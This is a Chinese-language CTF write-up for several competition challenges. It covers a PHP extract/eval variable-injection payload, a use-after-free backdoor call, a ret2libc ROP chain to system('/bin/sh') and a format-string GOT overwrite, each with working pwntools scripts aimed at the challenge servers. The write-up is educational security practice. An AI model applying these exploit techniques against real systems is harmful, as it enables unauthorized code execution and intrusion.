<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script> <script type="text/x-mathjax-config"> MathJax.Hub.Config({ tex2jax: { skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'], inlineMath: [['$','$'], ["\\(","\\)"]], displayMath: [["$$","$$"], ["\\[","\\]"]] } }); </script>

# 2024年国科大本科生CTF竞赛部分题目write up

## Web

#### Fake Flags

点进去是一个俄罗斯方块的界面，提示2w分可以获得一个flag。第一反应是后端php接收一个可能名字叫score的参数用来验证并回显flag，如果是这样可以用Burpsuite抓包解决。按F12查看后，发现似乎并不是这样，用来分数的验证都是在前端的js进行：
```javascript
setInterval(() => {
  if (player.score >= 20000) {
    alert("Congratulations! You have completed the challenge.");
    alert("Flag: ucatflags{Th1s_1s_3_F4k3_Fl4g}");
  }
}, 1000);
```
显然这是一个假的flag，但是在js代码里有新的发现，可以看到有个url为`http://123.249.92.229/FakeFlags/actually_flag.php`。访问它，看到界面有很多的flag，下面有一个提交的表单，每一次刷新页面flag就会更新，看上去像随机更新的md5字符串，并且可以用F12看到注释:
`<!-- 在 session 有效期内提交我想要的那个 flag，我就给你本题真正的答案 -->`
此外还有一段这样的代码：
```html
    <form id="flagForm" action="check_flag.php" method="post">
        <label for="flag">Flag:</label>
        <input type="text" id="flag" name="flag" required>
        <button type="submit">Submit</button>
    </form>
```
可见这个`check_flag.php`是用来验证的，总而言之我们可以写一段爬虫程序用来完成提交过程：
```python
import requests
from lxml import html
url='http://123.249.92.229/FakeFlags/check_flag.php'
url1='http://123.249.92.229/FakeFlags/actually_flag.php'
flag=[]

session=requests.Session()
response=session.get(url=url1)
tree = html.fromstring(response.text)
li_elements = tree.xpath('//li')
list=[]
for li in li_elements:
    list.append(li.text)

for i in list:
    data={'flag':i}
    response=session.post(url=url,data=data)
    print(response.text)
```
注意这里要保持session，利用`lxml`库来解析html标签获取flag列表，利用`requests`库发送post请求即可。

#### OH NO!

打开看到一串像是乱码的东西，但是看到很多`goto`标签，应该是加了混淆，随便找个网站(或者自己下载工具)反混淆即可。得到原本的php代码如下所示：
```php
<?php
include "flag2.php";
highlight_file(__FILE__);
extract($_GET);
if (isset($PcbaG)) {
    die("No hacking"); 
} else {
}$kQoXQ = $_GET["input"];
if (!isset($kQoXQ)) {
    die("N0 hacking"); 
} else {
}if (preg_match("/[a-zA-Z0-9]/", $kQoXQ)) {
    die("No hacking"); 
} else {
}$SchKz = 1;
if ($kQoXQ == $SchKz) {
    die("No Hacking"); 
} else {
}if (strlen($kQoXQ) > 50) {
    die("No hack1ng"); 
} else {
}if (!preg_match("/^(?:[^().\"]|[().\"])*\$/", $kQoXQ) || preg_match("/(.)(?=.*\\1)/", str_replace(["^", "(", ")", ".", "\""], '', $kQoXQ))) {
    die("No hacking"); 
} else {
}while (0) {
    return false;
}$ZjvB_ = $kQoXQ;$pQDKV = 0;while ($pQDKV < strlen($ZjvB_)) {
    if (!($ZjvB_[$pQDKV] == "^")) {
        if (!($ZjvB_[$pQDKV] == "(")) {
            if (!($ZjvB_[$pQDKV] == ")")) {
                if (!($ZjvB_[$pQDKV] == ".")) {
                    if (!($ZjvB_[$pQDKV] == "\"")) {
                        $ZjvB_[$pQDKV] = chr(ord($ZjvB_[$pQDKV]) ^ 0x5);
                    } else {
                        $ZjvB_[$pQDKV] = "_";
                    }
                } else {
                    $ZjvB_[$pQDKV] = ",";
                }
            } else {
                $ZjvB_[$pQDKV] = "@";
            }
        } else {
            $ZjvB_[$pQDKV] = ";";
        }
    } else {
        $ZjvB_[$pQDKV] = "]";
    }
    $pQDKV++;
}try {
    $tQhTl = eval("return {$kQoXQ};");
} catch (ParseError $n7ryz) {
    die("Invalid input");
}if (!isset(${$tQhTl})) {
    die("Variable n0t set"); 
} else {
}echo ${$tQhTl};
```
php代码虽然看着很长，但是重点关注两个地方即可：
`extract($_GET);` `$tQhTl = eval("return {$kQoXQ};");`。前面一段代码会将GET传参进来的任何东西都变成变量，因此利用这段代码我可以控制传进来的变量，后面一段代码将则eval函数中的字符串当初可执行代码执行，现在我想最后一段的代码是`echo $flag`，那么要求`$tQhTl=flag`，`$tQhTl`是我们`input`传参的内容，但是前面有很多绕过，数字与字母都不可用，这时候可以利用php代码中`{}`的变量解析规则(很多模板注入攻击似乎也是基于此)，`{}`会将变量转为它们的值，于是可以构造payload如下：
`?input=$_&_=flag`。现在`$kQoXQ`将被转为`$_`进一步转为`flag`，现在就可以获得flag了。

当然，我们现在还覆写flag输出，比如构造payload如下：`?input=$_&_=flag&flag=I love CTF`就可以得到I love CTF的输出。

## PWN

#### IAmFree!

笔者生平做出来的第一道heap题，还是很开心的。题目以及提示的很明显了，uaf(use after free)，执行free之后没有清空指针将会出现野指针的情况，如果我们能重新在指针指向的地址处写入内容就可以达到执行一些命令。

首先checksec看看什么情况：
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
64位程序，保护全开。拖进ida看看：
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  void (**v3)(void); // rax
  int v5; // [rsp+8h] [rbp-28h] BYREF
  int v6; // [rsp+Ch] [rbp-24h] BYREF
  void (**v7)(void); // [rsp+10h] [rbp-20h]
  void (**v8)(void); // [rsp+18h] [rbp-18h]
  void (**v9)(void); // [rsp+20h] [rbp-10h]
  unsigned __int64 v10; // [rsp+28h] [rbp-8h]

  v10 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  v8 = (void (**)(void))malloc(0x10uLL);
  if ( !v8 )
  {
    puts("Alloca Error");
    exit(1);
  }
  v9 = (void (**)(void))malloc(0x10uLL);
  if ( !v9 )
  {
    puts("Alloca Error");
    exit(1);
  }
  *v8 = (void (*)(void))HelloJoker;
  *v9 = (void (*)(void))HelloJoker;
  puts("        (  (          ");
  puts(" `  )   )\\))(    (    ");
  puts(" /(/(  ((_)()\\   )\\ ) ");
  puts("((_)_\\ _(()((_) _(_/( ");
  puts("| '_ \\)\\ V  V /| ' \\))");
  puts("| .__/  \\_/\\_/ |_||_| ");
  puts("|_|                   ");
  puts(byte_20E0);
  puts("Welcome to the Joker's Circus!");
  puts(byte_20E0);
  puts("Please choose a joker:");
  puts("1. \x1B[31mThe Red Joker\x1B[0m");
  puts("2. \x1B[30mThe Black Joker\x1B[0m");
  printf("> ");
  __isoc99_scanf("%d", &v5);
  if ( !v5 )
  {
    puts("Alloca Error");
    exit(1);
  }
  puts("Okey! I will hide it!");
  printf("Ah! He has left something for you: go to %p to FIND ME!", backdoor);
  if ( v5 == 1 )
    HideAJoker(v8);
  else
    HideAJoker(v9);
  puts("Now please say something to the other joker:");
  printf("How long?\n> ");
  __isoc99_scanf("%d", &v6);
  if ( v5 == 1 )
    v3 = v8;
  else
    v3 = v9;
  v7 = v3;
  v3[1] = (void (*)(void))malloc(v6);
  if ( !v7[1] )
  {
    puts("Alloca Error");
    exit(1);
  }
  printf("Say it!\n> ");
  read(0, v7[1], v6);
  puts("Guess who is the hidden joker?");
  printf("> ");
  __isoc99_scanf("%d", &v5);
  if ( !v5 )
  {
    puts("Alloca Error");
    exit(1);
  }
  if ( v5 == 1 )
    v7 = v8;
  else
    v7 = v9;
  (*v7)();
  return 0;
}
```
首先开辟了v8,v9两处内存空间(16字节)，对应两个Joker，然后根据你的输入(第一次输入)决定对哪一块释放内存(HideJoker)，然后会输出后门函数地址，并根据我们输入的长度重新开辟一处内存v6(第二次输入)，并且可以在这一处开辟的内存写入(第三次输入)，最后根据你的输入决定执行v8或v9的函数。

一个非常有意思的事情是，如果我们重新开辟的内存大小与上一次释放的内存大小相同，那么系统会在一个一样的位置建一个新堆。我们可以用gdb调试具体看看是什么情况：
1. 在第一次输入之前查看堆(heap chunks)：
```
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     92 52 55 55 55 55 00 00 00 00 00 00 00 00 00 00    .RUUUU..........]
Chunk(addr=0x5555555592c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592c0     92 52 55 55 55 55 00 00 00 00 00 00 00 00 00 00    .RUUUU..........]
Chunk(addr=0x5555555592e0, size=0x20d30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
显然中间的两个即为v8与v9(我的Kali似乎分配了32字节)，注意看地址分别为`addr=0x5555555592a0`与`addr=0x5555555592c0`。
2. 现在我们输入1，然后看看堆的变化情况
```
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     59 55 55 55 05 00 00 00 11 9f 6f 5f 80 af 31 07    YUUU......o_..1.]
Chunk(addr=0x5555555592c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592c0     92 52 55 55 55 55 00 00 00 00 00 00 00 00 00 00    .RUUUU..........]
Chunk(addr=0x5555555592e0, size=0x20d30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
对比上下，我们发现地址为`0x5555555592a0`那处堆被弃用了。
3. 假定我们现在第二次输入为32(v6的大小)，看看堆的情况：
```
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     59 55 55 55 05 00 00 00 e0 92 55 55 55 55 00 00    YUUU......UUUU..]
Chunk(addr=0x5555555592c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592c0     92 52 55 55 55 55 00 00 00 00 00 00 00 00 00 00    .RUUUU..........]
Chunk(addr=0x5555555592e0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592e0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555559310, size=0x20d00, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
在地址为`0x5555555592e0`处开辟了一个新堆，那如果输入16会怎样呢：
```
Chunk(addr=0x555555559010, size=0x290, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x5555555592a0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592a0     59 55 55 55 05 00 00 00 a0 92 55 55 55 55 00 00    YUUU......UUUU..]
Chunk(addr=0x5555555592c0, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x00005555555592c0     92 52 55 55 55 55 00 00 00 00 00 00 00 00 00 00    .RUUUU..........]
Chunk(addr=0x5555555592e0, size=0x20d30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  top chunk
```
我们发现如果我们第二次输入为16，那么heap将会建在v8所指的位置，现在我们往上面写入后门函数所指的地址就可以了。

PS:但是比较好玩的事情是，这个动态内存分配比较神奇，笔者尝试输入14-24的长度似乎都能跑出flag来，可以自行尝试，交互代码如下所示：
```python
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
#io=process('./uaf')
io=remote('124.16.75.162',31049)
io.recvuntil(b'>')
io.sendline(b'1')
io.recvline()
addr=io.recvline()[41:55].decode()
io.recvuntil(b'>')
print(addr)
io.sendline(b'16')
io.recvuntil(b'>')
payload=p64(int(addr,16))+b'\x00'*6
io.sendline(payload)
io.recvuntil(b'>')
io.sendline(b'1')
io.interactive()
```

#### knight_and_dragon

这是笔者想了最久的一道题目(除了没做出来的)，相当有意思的一道题目，首先打败恶龙的方法利用的是整型溢出(太大的数就变成负数了)，但是笔者暂时只摸索出来打败baby dragon的套路，打别的龙程序好像会停住，考虑到选择2有$50\%$的概率打宝贝龙，程序多试几次就像；打败龙之后可以跳转到win函数，这里存在明显栈溢出漏洞，笔者采用的方法是三次栈溢出，前两次分别泄露`puts`函数真实地址与`system`函数真实地址，从而确定libc库进而确定字符串`/bin/sh`地址，最后一次栈溢出构造执行`system('/bin/sh')`即可。

老规矩先checksec一下：
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
64位程序，开了栈不可执行保护，但是没有地址随机化与栈溢出保护。
1. 整型溢出
我们首先关注ida中打龙函数(servant_fight)的baby dragon：
```C
v8 = 80;
v7 = 50;
v6 = 50;
puts("BABYYY MoNsTeR{[HP: 80, ATK: 30, Life Regeneration: +5]}");
puts("YYYOUUUUU, Challenger!\n[hp: 45, mp: 50]\n(Guess your .';;.l',)");
puts("STARTTTTTTT!");
while ( 1 )
{
    choice = get_choice();
    if ( choice == 1 )
    {
    if ( v6 > 24 )
    {
        v8 -= 2;
        v6 -= 25;
    }
    }
    else if ( choice == 2 )
    {
    v7 += 100;
    }
    v8 += 5;
    v7 -= 30;
    printf("Mon././:hp: %d, YOU: hp: %d, mp: %d\n", (unsigned int)v8, (unsigned int)v7, (unsigned int)v6);
    if ( v7 <= 0 )
    break;
    if ( !v8 )
    return win();
}
```
这里输出似乎有些问题，按照定义，龙的hp初始是80，勇者的初始hp与mp均为50(输出hp是45)。打龙流程是这样的：如果选择1，我们消耗25点mp，龙扣2hp，如果选择2，我们回复100hp，并且在选择结束后，龙恢复5hp，我们扣除30hp。游戏终止条件是龙血量归0(跳转到win函数)或者我们hp小于等于0。

乍一看龙怎么都死不了，但是我们不妨先尝试一下，我们连按两下2，我们生命值每回合可以加$100-30=70$，理论上连续选择两次2之后我们生命值应该是190，但是游戏失败，一看输出hp=-66，仔细看看这些变量的类型：
```C
  int choice; // eax
  int v2; // [rsp+4h] [rbp-Ch]
  char v3; // [rsp+Ah] [rbp-6h]
  char v4; // [rsp+Bh] [rbp-5h]
  char v5; // [rsp+Ch] [rbp-4h]
  char v6; // [rsp+Dh] [rbp-3h]
  char v7; // [rsp+Eh] [rbp-2h]
  char v8; // [rsp+Fh] [rbp-1h]
```

原来hp与mp都是char类型，可以表示$-127$到$127$之间的数，如果正数超过127就会溢出成负数，现在我们明白打龙的要点了，保持自己hp不归零的情况下，让龙一直加血直到变成负数再加血到0。但是我们发现龙每回合加血没办法刚好到0，我们可以通过选择1让两个回合龙只加3滴血，从而龙可以刚好到0。因此baby dragon的打龙策略是:
```py
game=[b'2',b'3',b'3',b'3',b'2',b'3',b'3',b'3',b'2',b'3',b'3',b'2',b'1',b'1',b'2',b'3',b'3',b'3',b'2',b'3',b'3',b'2',b'3',b'3',b'2',b'3',b'3',b'3',b'2',b'3',b'3',b'2',b'3',b'3',b'2',b'3']  #babydragon攻略
```

2. 通过栈溢出与got表泄露函数地址
win函数中fgets可以接收256个字节，存在明显的栈溢出漏洞，padding大小可以查看栈空间，为120个字节。
在ida中除了代码段之外，我们还可以看到plt段，got段，在程序调用库函数的时候，会先跳转到plt段，plt中存储着got表的地址，plt跳转到got段之后，如果是第一次调用，got又会跳转回plt解析库函数真实地址并将地址存入got段中，之后再调用即可以直接在got段中跳转执行。
系统已经调用过`puts`函数，那么还可以泄露哪个库函数呢？我们发现有个`os_start_`函数，可以输入114514让它调用一次`system`函数，这样我们got表中就有两个libc函数的真实地址了，可以利用`puts`函数泄露，值得一提的是在64位程序中前6个参数使用寄存器传参，第一个是rdi寄存器，所以我们需要先利用ROPgadget工具找到形如如下指令：`pop rdi;retn`用来构造调用`puts`函数。
```python
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
system_got=elf.got['system']
rdi_addr=0x4018c3
win_addr=0x401291
io.sendline(b"a"*120+p64(rdi_addr)+p64(0x404018)+p64(puts_plt)+p64(win_addr))
puts_real_addr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_real_addr))
io.sendline(b"a"*120+p64(rdi_addr)+p64(system_got)+p64(puts_plt)+p64(win_addr))
system_real_addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(system_real_addr)) 
```
每次栈溢出之后返回win函数用来进行多次栈溢出。根据泄露的`puts`函数与`system`函数后三位确定libc库进而确定`/bin/sh`真实地址(libc函数偏移保持不变)。

3. 栈溢出执行system
最后一步就很简单了：
```python
puts_libc_addr=0x84420  #根据泄露的system函数与puts函数真实地址查库后确定
sh_libc_addr=0x1b45bd
system_libc_addr=0x52290
sh_real_addr=sh_libc_addr+(puts_real_addr-puts_libc_addr)
ret_addr=0x000000000040101a
io.sendline(b"a"*120+p64(rdi_addr)+p64(sh_real_addr)+p64(ret_addr)+p64(system_real_addr)) #如果是直接调用text段里面的call system，不需要p64(ret_addr)，如果是调用system函数真实地址，需要p64(ret_addr)。
io.interactive()
```
值得一提的是，如果构造调用的`system`函数来自于代码段的`call system`则不需要添加`ret_addr`，如果是直接到`system`函数真实地址调用则需要。`ret_addr`也可以通过ROPgadget工具找到。

完整代码如下所示：
```python
from pwn import *
context (os='linux', arch='amd64', log_level='debug')
io=remote('124.16.75.162',31048)
#io=process('./vuln')
elf=ELF('./vuln')
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
system_got=elf.got['system']
io.recvuntil(b"Servant\n")
io.sendline(b"114514")
io.recvuntil(b"Servant\n")
io.sendline(b"2")
io.recvuntil(b"STARTTTTTTT!\n")
game=[b'2',b'3',b'3',b'3',b'2',b'3',b'3',b'3',b'2',b'3',b'3',b'2',b'1',b'1',b'2',b'3',b'3',b'3',b'2',b'3',b'3',b'2',b'3',b'3',b'2',b'3',b'3',b'3',b'2',b'3',b'3',b'2',b'3',b'3',b'2',b'3']  #babydragon攻略
for i in game:
    io.sendline(i)
    io.recv()
rdi_addr=0x4018c3
win_addr=0x401291
io.sendline(b"a"*120+p64(rdi_addr)+p64(0x404018)+p64(puts_plt)+p64(win_addr))
puts_real_addr=u64(io.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_real_addr))
io.sendline(b"a"*120+p64(rdi_addr)+p64(system_got)+p64(puts_plt)+p64(win_addr))
system_real_addr=u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(system_real_addr)) 
puts_libc_addr=0x84420  #根据泄露的system函数与puts函数真实地址查库后确定
sh_libc_addr=0x1b45bd
system_libc_addr=0x52290
sh_real_addr=sh_libc_addr+(puts_real_addr-puts_libc_addr)
ret_addr=0x000000000040101a
io.sendline(b"a"*120+p64(rdi_addr)+p64(sh_real_addr)+p64(ret_addr)+p64(system_real_addr)) #如果是直接调用text段里面的call system，不需要p64(ret_addr)，如果是调用system函数真实地址，需要p64(ret_addr)。
io.interactive()
```
#### your_own_flag
一道典型的格式化字符串漏洞题，漏洞点在于`io`函数中的`printf(format)`。因为没有格式化参数，因此某种程度上可以完成任意地址的读与写。

在这里先介绍几个可能会用到的参数：
```
%p:泄露栈上地址值
%s:泄露栈上地址(如果这个地址真的存在)指向的内容
%n:不会输出什么东西，但是会将当前已经输出的字节数作为一个整型写到指定地址。
```
但是这道题有意思的地方在于，它将用户的输入做了一些小替换(change_str函数)：
大写字母全部按下表替换：
`'4BcDEFGHIJKLMNOPQRSTVUWXYZ'`
小写字母按下表替换：
`'@6Cdefgh1jk1mn0p9rstuvw*y2'`
数字按下表替换：
`'OiZ3A5b78q'`
但是其实这个替换可以用`\x00`也就是截断符绕过，strlen函数读到`\x00`就不读了，但是fgets会继续读取，因此我们只需要在payload最前加一个`\x00`就可以规避掉change_str函数的变换了(但是很遗憾，笔者没学过C语言，所以编了一个逆变换的函数用来做这道题，到最后一步才发现可以这样绕，后面会看到)。

这道题目的基本流程是：通过%p泄露返回地址从而确定PIE偏移，确定PIE偏移之后就可以确定got表地址，找到`printf`函数got表地址并利用%n将其存入的`printf`函数真实地址覆写为`system`函数真实地址，这样传入参数执行`printf(format)`就变成`system(format)`了。
先简单checksec一下：
```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
1. 确定PIE地址偏移。
我们先输几个%p，并利用gdb调试看看栈上到底是什么情况。先构造payload:`aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p`。
看到输出：
`@@@@@@@@-0x1-0x1-0x7ffff7ea1887-0x12-(nil)-0x7ffff7d8a740-0x7fffffffd950-0x4040404040404040-0x252d70252d70252d-0x2d70252d70252d70`。前面一串`@`是变换后的`a`，后面的是泄露的栈上的内容么？不完全是，在64位系统中，前6个参数的传参依靠寄存器进行，因此前面的%p泄露的是寄存器上的内容，寄存器传参顺序分别为`rdi,rsi,rdx,rcx,r8,r9`,其中`rdi`用来传递格式化字符串本身(也就是format)，那么输出的前五个应当是`rsi,rdx,rcx,r8,r9`寄存器内容，我们gdb调试将断点下在`b printf`，然后查看寄存器内容`info registers`，果然和我们预期相同。顺便我们可以看看`rdi`这个地址所指向的内容`x/20gx $rdi`,可以看到这个地址的值就是`0x4040404040404040`，这是我们的第8个参数，那么第六第七呢，我们往前看看`x/20gx $rdi-16`,果然，`0x7ffff7d8a740 0x7fffffffd950`对应的是`rdi`所指向内容的往前前16个字节与往前8个字节。现在我们确定format存储的起始地址之后，就可以在栈空间找到对应的返回地址了，其对应的是第21个参数，我们可以直接用`%21$p`输出它，但是注意字符串变换，我们得输入`%zi%p`。在gdb调试中发现输出的后三位是523，对应的正是io函数的返回地址(也即`call io`的下一条指令jmp)，我们预测是正确的。这样我们利用泄露的地址与ida中的地址相减就得到PIE的偏移，再加上ida中`printf`的got表地址就得到其真实got表地址。
```py
io=remote('124.16.75.162',31043)
#io=process('./vuln')
elf = ELF("./vuln")
libc = ELF("./libc.so.6")
puts_got = elf.got['puts']
printf_got = elf.got['printf']
print(hex(libc.sym['system']),hex(libc.sym['printf']))
system_libc=0x52290
printf_libc=0x61c90
io.recvuntil(b'>')
io.sendline(b'p')
io.recvuntil(b'>')
io.sendline(b'%zi$p')  
#21 用于泄露栈上返回地址，call io指令的下一条是jmp，后三位都是523，泄露出来结果对的上，可以确定PIE导致的偏移从而确定got表地址。此外测试结果显示format的首地址在%8p处，其实我有点奇怪，五个寄存器(rdi存储格式化字符串参数)，偏移量应该是6，rdi本身也是指向这个位置，但是似乎把rdi指向的这个位置前面两个地址也包括进去了，导致偏移量为5+2=7，因此format首个地址在8，再根据栈空间确定返回地址在21处。
jump_text_addr=0x1523
io.recvline()
jump_real_addr=int(io.recv()[0:14].decode(),16)
base_addr=jump_real_addr-jump_text_addr
printf_real_got=base_addr+printf_got  
```
2. 覆写got表中printf函数真实地址
首先我们可以利用%s读出got表地址内容，也就是`prinrf`的真实地址，首先前面8位是我们的format内容，所以相应的我们地址写在`%9$p`。
```py
change_printf_real_got=reverse_transform_integer(printf_real_got)
io.sendline(b'aaaa%q$s'+p64(change_printf_real_got))
io.recvline()
printf_real_addr=u64(io.recv()[4:10].ljust(8,b'\x00'))
#print(hex(printf_real_addr))
```
这里的`reverse_transform_integer`是用来逆变换的：
```py
def reverse_transform_integer(input_value):
    # 替换表
    table1 = '@6Cdefgh1jk1mn0p9rstuvw*y2'
    table2 = '4BcDEFGHIJKLMNOPQRSTVUWXYZ'
    table3 = 'OiZ3A5b78q'

    original_bytes = []

    # 将整数分解为字节
    hex_bytes = input_value.to_bytes((input_value.bit_length() + 7) // 8, byteorder='big')
    
    for byte in hex_bytes:
        char = chr(byte)  # 转换字节为字符
        if char in table1:  # 在 table1 中，逆向为小写字母
            original_bytes.append(table1.index(char) + ord('a'))
        elif char in table2:  # 在 table2 中，逆向为大写字母
            original_bytes.append(table2.index(char) + ord('A'))
        elif char in table3:  # 在 table3 中，逆向为数字
            original_bytes.append(table3.index(char) + ord('0'))
        else:
            original_bytes.append(byte)  # 保留未匹配的字符

    # 组合字节并返回原始整数
    return int.from_bytes(original_bytes, byteorder='big')
```
泄露的地址与libc中`printf`地址后三位相符合，因此我们进而可以通过偏移得到`system`真实地址。我们发现`printf`与`system`地址仅有倒数第二与第三字节不同，但是为了方便，我们就覆盖后三个字节。我们用%hhn进行覆盖，这是逐字节覆盖，问题在于我们如何输出这么多？可以利用%c方法，用这个方法可以形成任意多输入，但是我们注意到%hhn是逐字节，因此超过255之后就会重新回到0，通过这个方法就可以逐步修改字节了：
```py
payload = ('%'+change_num1+'C%i3$hhn').encode()           #利用%hhn进行逐字节写入
payload += ('%'+change_num2+'C%iA$hhn').encode()
payload += ('%'+change_num3+'C%i5$hhn').encode()
payload = payload.ljust(12 * 3 + 4, b'a')
payload += p64(reverse_transform_integer(printf_real_got)) + p64(printf_real_got+1) + p64(printf_real_got+2) #太坑了，第一个地址字符变换后有零截断，所以后面两个地址没有进行变换，不需要进行字符变换。
```
最需要注意的是，由于这里`printf`地址没有8个字节，存在`\x00`填充，因此在变换第一个之后，后面就不需要变换了(这也是我意识到怎么绕过change_str的原因)。

PS:这题主要是限制了读入字符，如果可以多读一点，可以通过泄露Canary完成栈溢出然后ret2libc也是可以成立的。


## 最后
如果有任何可能的问题或者见解，欢迎在群里讨论，毕竟我也不是很会喵。